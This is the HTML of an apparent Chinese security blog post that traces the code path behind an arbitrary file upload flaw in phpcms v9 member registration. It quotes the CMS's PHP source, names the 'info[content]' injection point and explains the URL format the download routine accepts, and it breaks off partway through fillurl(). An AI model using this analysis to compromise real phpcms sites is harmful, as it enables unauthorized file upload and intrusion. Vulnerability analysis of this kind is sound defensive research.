@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>phpcmsv9任意文件上传漏洞 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言phpcmsv9任意文件上传漏洞 漏洞分析定位：.&#x2F;phpcms&#x2F;modules&#x2F;member&#x2F;index.php::register.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public function register() &amp;#123;	$this-&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpcmsv9任意文件上传漏洞">
+<meta property="og:url" content="http://yoursite.com/2020/02/10/phpcmsv9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言phpcmsv9任意文件上传漏洞 漏洞分析定位：.&#x2F;phpcms&#x2F;modules&#x2F;member&#x2F;index.php::register.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public function register() &amp;#123;	$this-&amp;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/.com//cookie/blog/source/_posts/phpcmsv9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png">
+<meta property="og:image" content="http://yoursite.com/.com//cookie/blog/source/_posts/phpcmsv9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%EF%BC%92.png">
+<meta property="article:published_time" content="2020-02-10T14:24:31.000Z">
+<meta property="article:modified_time" content="2020-02-10T08:55:50.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/.com//cookie/blog/source/_posts/phpcmsv9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-phpcmsv9任意文件上传漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/02/10/phpcmsv9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2020-02-10T14:24:31.000Z" itemprop="datePublished">2020-02-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      phpcmsv9任意文件上传漏洞
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>phpcmsv9任意文件上传漏洞</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>定位：<code>./phpcms/modules/member/index.php::register.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;_session_start();</span><br><span class="line">	<span class="comment">//获取用户siteid</span></span><br><span class="line">	$siteid = <span class="keyword">isset</span>($_REQUEST[<span class="string">'siteid'</span>]) &amp;&amp; trim($_REQUEST[<span class="string">'siteid'</span>]) ? intval($_REQUEST[<span class="string">'siteid'</span>]) : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">//定义站点id常量</span></span><br><span class="line">	<span class="keyword">if</span> (!defined(<span class="string">'SITEID'</span>)) &#123;</span><br><span class="line">	   define(<span class="string">'SITEID'</span>, $siteid);</span><br><span class="line">	&#125;</span><br><span class="line">	... ...</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>])) &#123;</span><br><span class="line">		<span class="keyword">if</span>($member_setting[<span class="string">'enablcodecheck'</span>]==<span class="string">'1'</span>)&#123;<span class="comment">//开启验证码</span></span><br><span class="line">			<span class="keyword">if</span> ((<span class="keyword">empty</span>($_SESSION[<span class="string">'connectid'</span>]) &amp;&amp; $_SESSION[<span class="string">'code'</span>] != strtolower($_POST[<span class="string">'code'</span>]) &amp;&amp; $_POST[<span class="string">'code'</span>]!==<span class="keyword">NULL</span>) || <span class="keyword">empty</span>($_SESSION[<span class="string">'code'</span>])) &#123;</span><br><span class="line">				showmessage(L(<span class="string">'code_error'</span>));</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				$_SESSION[<span class="string">'code'</span>] = <span class="string">''</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		$userinfo = <span class="keyword">array</span>();</span><br><span class="line">		$userinfo[<span class="string">'encrypt'</span>] = create_randomstr(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">		$userinfo[<span class="string">'username'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; is_username($_POST[<span class="string">'username'</span>])) ? $_POST[<span class="string">'username'</span>] : <span class="keyword">exit</span>(<span class="string">'0'</span>);</span><br><span class="line">		$userinfo[<span class="string">'nickname'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'nickname'</span>]) &amp;&amp; is_username($_POST[<span class="string">'nickname'</span>])) ? $_POST[<span class="string">'nickname'</span>] : <span class="string">''</span>;</span><br><span class="line">		</span><br><span class="line">		$userinfo[<span class="string">'email'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'email'</span>]) &amp;&amp; is_email($_POST[<span class="string">'email'</span>])) ? $_POST[<span class="string">'email'</span>] : <span class="keyword">exit</span>(<span class="string">'0'</span>);</span><br><span class="line">		$userinfo[<span class="string">'password'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) &amp;&amp; is_badword($_POST[<span class="string">'password'</span>])==<span class="keyword">false</span>) ? $_POST[<span class="string">'password'</span>] : <span class="keyword">exit</span>(<span class="string">'0'</span>);</span><br><span class="line">		</span><br><span class="line">		$userinfo[<span class="string">'email'</span>] = (<span class="keyword">isset</span>($_POST[<span class="string">'email'</span>]) &amp;&amp; is_email($_POST[<span class="string">'email'</span>])) ? $_POST[<span class="string">'email'</span>] : <span class="keyword">exit</span>(<span class="string">'0'</span>);</span><br><span class="line"></span><br><span class="line">		$userinfo[<span class="string">'modelid'</span>] = <span class="keyword">isset</span>($_POST[<span class="string">'modelid'</span>]) ? intval($_POST[<span class="string">'modelid'</span>]) : <span class="number">10</span>;</span><br><span class="line">		$userinfo[<span class="string">'regip'</span>] = ip();</span><br><span class="line">		$userinfo[<span class="string">'point'</span>] = $member_setting[<span class="string">'defualtpoint'</span>] ? $member_setting[<span class="string">'defualtpoint'</span>] : <span class="number">0</span>;</span><br><span class="line">		$userinfo[<span class="string">'amount'</span>] = $member_setting[<span class="string">'defualtamount'</span>] ? $member_setting[<span class="string">'defualtamount'</span>] : <span class="number">0</span>;</span><br><span class="line">		$userinfo[<span class="string">'regdate'</span>] = $userinfo[<span class="string">'lastdate'</span>] = SYS_TIME;</span><br><span class="line">		$userinfo[<span class="string">'siteid'</span>] = $siteid;</span><br><span class="line">		$userinfo[<span class="string">'connectid'</span>] = <span class="keyword">isset</span>($_SESSION[<span class="string">'connectid'</span>]) ? $_SESSION[<span class="string">'connectid'</span>] : <span class="string">''</span>;</span><br><span class="line">		$userinfo[<span class="string">'from'</span>] = <span class="keyword">isset</span>($_SESSION[<span class="string">'from'</span>]) ? $_SESSION[<span class="string">'from'</span>] : <span class="string">''</span>;</span><br><span class="line">           ... ...</span><br><span class="line">           <span class="comment">//附表信息验证 通过模型获取会员信息</span></span><br><span class="line">		<span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;</span><br><span class="line">			<span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_input.class.php'</span>;</span><br><span class="line">	        <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_update.class.php'</span>;</span><br><span class="line">			$member_input = <span class="keyword">new</span> member_input($userinfo[<span class="string">'modelid'</span>]);		</span><br><span class="line">			$_POST[<span class="string">'info'</span>] = array_map(<span class="string">'new_html_special_chars'</span>,$_POST[<span class="string">'info'</span>]);</span><br><span class="line">			$user_model_info = $member_input-&gt;get($_POST[<span class="string">'info'</span>]);				        				</span><br><span class="line">		&#125;</span><br><span class="line">           ... ...</span><br></pre></td></tr></table></figure>
+
+
+
+<p>关键代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;</span><br><span class="line">	<span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_input.class.php'</span>;</span><br><span class="line">       <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_update.class.php'</span>;</span><br><span class="line">	$member_input = <span class="keyword">new</span> member_input($userinfo[<span class="string">'modelid'</span>]);		</span><br><span class="line">	$_POST[<span class="string">'info'</span>] = array_map(<span class="string">'new_html_special_chars'</span>,$_POST[<span class="string">'info'</span>]);</span><br><span class="line">	$user_model_info = $member_input-&gt;get($_POST[<span class="string">'info'</span>]);				        				</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>加载模块后，定义一个新的<code>member_input对象</code>．然后<code>POST</code>一个info．跟进<code>get()</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;data = $data = trim_script($data);</span><br><span class="line">	$model_cache = getcache(<span class="string">'member_model'</span>, <span class="string">'commons'</span>);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db_pre.$model_cache[<span class="keyword">$this</span>-&gt;modelid][<span class="string">'tablename'</span>];</span><br><span class="line"></span><br><span class="line">	$info = <span class="keyword">array</span>();</span><br><span class="line">	$debar_filed = <span class="keyword">array</span>(<span class="string">'catid'</span>,<span class="string">'title'</span>,<span class="string">'style'</span>,<span class="string">'thumb'</span>,<span class="string">'status'</span>,<span class="string">'islink'</span>,<span class="string">'description'</span>);</span><br><span class="line">	<span class="keyword">if</span>(is_array($data)) &#123;</span><br><span class="line">		<span class="keyword">foreach</span>($data <span class="keyword">as</span> $field=&gt;$value) &#123;</span><br><span class="line">			<span class="keyword">if</span>($data[<span class="string">'islink'</span>]==<span class="number">1</span> &amp;&amp; !in_array($field,$debar_filed)) <span class="keyword">continue</span>;</span><br><span class="line">			$field = safe_replace($field);</span><br><span class="line">			$name = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'name'</span>];</span><br><span class="line">			$minlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'minlength'</span>];</span><br><span class="line">			$maxlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'maxlength'</span>];</span><br><span class="line">			$pattern = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'pattern'</span>];</span><br><span class="line">			$errortips = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'errortips'</span>];</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">empty</span>($errortips)) $errortips = <span class="string">"$name 不符合要求！"</span>;</span><br><span class="line">			$length = <span class="keyword">empty</span>($value) ? <span class="number">0</span> : strlen($value);</span><br><span class="line">			<span class="keyword">if</span>($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(<span class="string">"$name 不得少于 $minlength 个字符！"</span>);</span><br><span class="line">			<span class="keyword">if</span> (!array_key_exists($field, <span class="keyword">$this</span>-&gt;fields)) showmessage(<span class="string">'模型中不存在'</span>.$field.<span class="string">'字段'</span>);</span><br><span class="line">			<span class="keyword">if</span>($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) &#123;</span><br><span class="line">				showmessage(<span class="string">"$name 不得超过 $maxlength 个字符！"</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				str_cut($value, $maxlength);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'isunique'</span>] &amp;&amp; <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>($field=&gt;$value),$field) &amp;&amp; ROUTE_A != <span class="string">'edit'</span>) showmessage(<span class="string">"$name 的值不得重复！"</span>);</span><br><span class="line">			$func = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'formtype'</span>];</span><br><span class="line">			<span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</span><br><span class="line"></span><br><span class="line">			$info[$field] = $value;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关键代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>$func</code>在为本文件中的<code>editor()</code>，原因是因为我们的payload为<code>info[content]</code>，然后跟进<code>editor()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">editor</span><span class="params">($field, $value)</span> </span>&#123;</span><br><span class="line">   $setting = string2array(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'setting'</span>]);</span><br><span class="line">   $enablesaveimage = $setting[<span class="string">'enablesaveimage'</span>];</span><br><span class="line">   $site_setting = string2array(<span class="keyword">$this</span>-&gt;site_config[<span class="string">'setting'</span>]);</span><br><span class="line">   $watermark_enable = intval($site_setting[<span class="string">'watermark_enable'</span>]);</span><br><span class="line">   $value = <span class="keyword">$this</span>-&gt;attachment-&gt;download(<span class="string">'content'</span>, $value,$watermark_enable);</span><br><span class="line">   <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后跟进download()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 附件下载</span></span><br><span class="line"><span class="comment"> * Enter description here ...</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $field 预留字段</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $value 传入下载内容</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $watermark 是否加入水印</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $ext 下载扩展名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $absurl 绝对路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $basehref </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($field, $value,$watermark = <span class="string">'0'</span>,$ext = <span class="string">'gif|jpg|jpeg|bmp|png'</span>, $absurl = <span class="string">''</span>, $basehref = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $image_d;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;att_db = pc_base::load_model(<span class="string">'attachment_model'</span>);</span><br><span class="line">	$upload_url = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;field = $field;</span><br><span class="line">	$dir = date(<span class="string">'Y/md/'</span>);</span><br><span class="line">	$uploadpath = $upload_url.$dir;</span><br><span class="line">	$uploaddir = <span class="keyword">$this</span>-&gt;upload_root.$dir;</span><br><span class="line">	$string = new_stripslashes($value);</span><br><span class="line">	<span class="keyword">if</span>(!preg_match_all(<span class="string">"/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i"</span>, $string, $matches)) <span class="keyword">return</span> $value;</span><br><span class="line">	$remotefileurls = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">		dir_create($uploaddir);</span><br><span class="line">		$remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">unset</span>($matches, $string);</span><br><span class="line">	$remotefileurls = array_unique($remotefileurls);</span><br><span class="line">	$oldpath = $newpath = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">foreach</span>($remotefileurls <span class="keyword">as</span> $k=&gt;$file) &#123;</span><br><span class="line">		<span class="keyword">if</span>(strpos($file, <span class="string">'://'</span>) === <span class="keyword">false</span> || strpos($file, $upload_url) !== <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">		$filename = fileext($file);</span><br><span class="line">		$file_name = basename($file);</span><br><span class="line">		$filename = <span class="keyword">$this</span>-&gt;getname($filename);</span><br><span class="line"></span><br><span class="line">		$newfile = $uploaddir.$filename;</span><br><span class="line">		$upload_func = <span class="keyword">$this</span>-&gt;upload_func;</span><br><span class="line">		<span class="keyword">if</span>($upload_func($file, $newfile)) &#123;</span><br><span class="line">			$oldpath[] = $k;</span><br><span class="line">			$GLOBALS[<span class="string">'downloadfiles'</span>][] = $newpath[] = $uploadpath.$filename;</span><br><span class="line">			@chmod($newfile, <span class="number">0777</span>);</span><br><span class="line">			$fileext = fileext($filename);</span><br><span class="line">			<span class="keyword">if</span>($watermark)&#123;</span><br><span class="line">				watermark($newfile, $newfile,<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">			&#125;</span><br><span class="line">			$filepath = $dir.$filename;</span><br><span class="line">			$downloadedfile = <span class="keyword">array</span>(<span class="string">'filename'</span>=&gt;$filename, <span class="string">'filepath'</span>=&gt;$filepath, <span class="string">'filesize'</span>=&gt;filesize($newfile), <span class="string">'fileext'</span>=&gt;$fileext);</span><br><span class="line">			$aid = <span class="keyword">$this</span>-&gt;add($downloadedfile);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;downloadedfiles[$aid] = $filepath;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> str_replace($oldpath, $newpath, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该函数是用于下载附件的．然后第一个关注点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match_all(<span class="string">"/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i"</span>, $string, $matches)) <span class="keyword">return</span> $value;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码的意思是：传入的下载内容要满足格式</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">href|src=url.gif|jpg|jpeg|bmp|png</span><br></pre></td></tr></table></figure>
+
+
+
+<p>接着第二个关注点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">	dir_create($uploaddir);</span><br><span class="line">	$remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进函数<code>fillurl</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillurl</span><span class="params">($surl, $absurl, $basehref = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($basehref != <span class="string">''</span>) &#123;</span><br><span class="line">		$preurl = strtolower(substr($surl,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">		<span class="keyword">if</span>($preurl==<span class="string">'http://'</span> || $preurl==<span class="string">'ftp://'</span> ||$preurl==<span class="string">'mms://'</span> || $preurl==<span class="string">'rtsp://'</span> || $preurl==<span class="string">'thunde'</span> || $preurl==<span class="string">'emule://'</span>|| $preurl==<span class="string">'ed2k://'</span>)</span><br><span class="line">		<span class="keyword">return</span>  $surl;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> $basehref.<span class="string">'/'</span>.$surl;</span><br><span class="line">	&#125;</span><br><span class="line">	$i = <span class="number">0</span>;</span><br><span class="line">	$dstr = <span class="string">''</span>;</span><br><span class="line">	$pstr = <span class="string">''</span>;</span><br><span class="line">	$okurl = <span class="string">''</span>;</span><br><span class="line">	$pathStep = <span class="number">0</span>;</span><br><span class="line">	$surl = trim($surl);</span><br><span class="line">	<span class="keyword">if</span>($surl==<span class="string">''</span>) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">	$urls = @parse_url(SITE_URL);</span><br><span class="line">	$HomeUrl = $urls[<span class="string">'host'</span>];</span><br><span class="line">	$BaseUrlPath = $HomeUrl.$urls[<span class="string">'path'</span>];</span><br><span class="line">	$BaseUrlPath = preg_replace(<span class="string">"/\/([^\/]*)\.(.*)$/"</span>,<span class="string">'/'</span>,$BaseUrlPath);</span><br><span class="line">	$BaseUrlPath = preg_replace(<span class="string">"/\/$/"</span>,<span class="string">''</span>,$BaseUrlPath);</span><br><span class="line">	$pos = strpos($surl,<span class="string">'#'</span>);</span><br><span class="line">	<span class="keyword">if</span>($pos&gt;<span class="number">0</span>) $surl = substr($surl,<span class="number">0</span>,$pos);</span><br><span class="line">	<span class="keyword">if</span>($surl[<span class="number">0</span>]==<span class="string">'/'</span>) &#123;</span><br><span class="line">		$okurl = <span class="string">'http://'</span>.$HomeUrl.<span class="string">'/'</span>.$surl;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>($surl[<span class="number">0</span>] == <span class="string">'.'</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(strlen($surl)&lt;=<span class="number">2</span>) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">elseif</span>($surl[<span class="number">0</span>]==<span class="string">'/'</span>) &#123;</span><br><span class="line">			$okurl = <span class="string">'http://'</span>.$BaseUrlPath.<span class="string">'/'</span>.substr($surl,<span 